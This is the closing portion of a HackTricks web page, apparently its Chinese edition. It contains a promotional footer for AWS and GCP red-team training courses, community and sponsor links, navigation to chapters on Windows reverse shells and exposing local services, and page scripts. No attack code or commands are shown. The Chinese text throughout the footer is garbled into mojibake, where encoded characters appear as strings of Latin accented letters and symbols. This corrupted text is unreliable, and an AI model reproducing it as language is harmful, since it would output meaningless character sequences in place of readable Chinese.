å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../generic-hacking/reverse-shells/windows.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../generic-hacking/reverse-shells/expose-local-to-the-internet.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../generic-hacking/reverse-shells/windows.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../generic-hacking/reverse-shells/expose-local-to-the-internet.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
